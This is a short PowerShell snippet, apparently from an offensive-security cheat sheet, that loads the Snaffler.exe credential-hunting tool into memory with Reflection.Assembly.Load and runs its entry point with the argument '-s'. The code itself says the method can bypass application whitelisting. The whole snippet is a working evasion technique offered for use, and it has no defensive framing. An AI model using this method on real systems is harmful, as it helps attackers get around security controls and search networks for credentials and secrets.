# This technique can in some cases be used to bypass application whitelisting
# The following example runs the tool Snaffler.exe with the argument -s
[byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe
$asm = [System.Reflection.Assembly]::Load($bytes)
$vars = New-Object System.Collections.Generic.List[System.Object]
$vars.Add("-s")
$passed = [string[]]$vars.ToArray()
$asm.EntryPoint.Invoke($null, @(,$passed))
